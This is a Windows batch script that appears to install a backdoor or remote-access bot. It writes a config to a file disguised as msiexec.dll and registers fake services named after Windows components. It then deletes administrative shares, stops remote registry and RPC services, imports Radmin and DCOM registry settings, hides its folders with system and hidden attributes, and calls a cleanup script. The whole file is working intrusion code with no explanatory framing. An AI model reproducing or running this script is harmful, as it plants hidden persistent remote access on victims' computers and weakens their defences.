@echo off

set mxbin=%windir%\system32\drivers\etc\rmtx\
set mxhome=%MXHOME%

echo uploaddir %windir%\system32\drivers\etc\rmtx\data\>>msiexec.dll
echo user_nick [UnLeAsHeD]-[C%RANDOM:~1,1%%RANDOM:~1,1%%RANDOM:~1,1%]>>msiexec.dll
echo filedir %windir%\system32\drivers\etc\rmtx\data\>>msiexec.dll

services.exe -install -name:"msiexec" -launch:"msiexec.exe msiexec.dll"
services.exe -install -name:"mswin32" -launch:"mswin32.exe"
net start msiexec
net start mswin32

net share /delete C$ /y >> system.dll
net share /delete E$ /y >> system.dll
net share /delete F$ /y >> system.dll
net share /delete G$ /y >> system.dll
net share /delete H$ /y >> system.dll
net share /delete I$ /y >> system.dll
net share /delete J$ /y >> system.dll
net share /delete Z$ /y >> system.dll
net share /delete F$ /y >> system.dll
net share /delete D$ /y >> system.dll
net share /delete ADMIN$ >> system.dll
net share /delete IPC$ >> system.dll
net stop "Remote Registry Service" >> system.dll 
net stop "Computer Browser" >> system.dll 
net stop "REMOTE PROCEDURE CALL" >> system.dll 
net stop "REMOTE PROCEDURE CALL SERVICE" >> system.dll 
regedit /s dcom.reg >> system.dll
regedit /s r_server.reg >> system.dll
regedit /s radmin.reg >> system.dll

attrib +H +S %windir%\system32\drivers\etc >> system.dll
attrib +H +S %windir%\system32\drivers\etc\rmtx >> system.dll
attrib +H +S %windir%\system32\drivers\etc\rmtx\msiexec.exe >> system.dll
attrib +H +S %windir%\system32\drivers\etc\rmtx\mswin32.exe >> system.dll
attrib +H +S %windir%\system32\drivers\etc\rmtx\data >> system.dll

call del.bat

exit
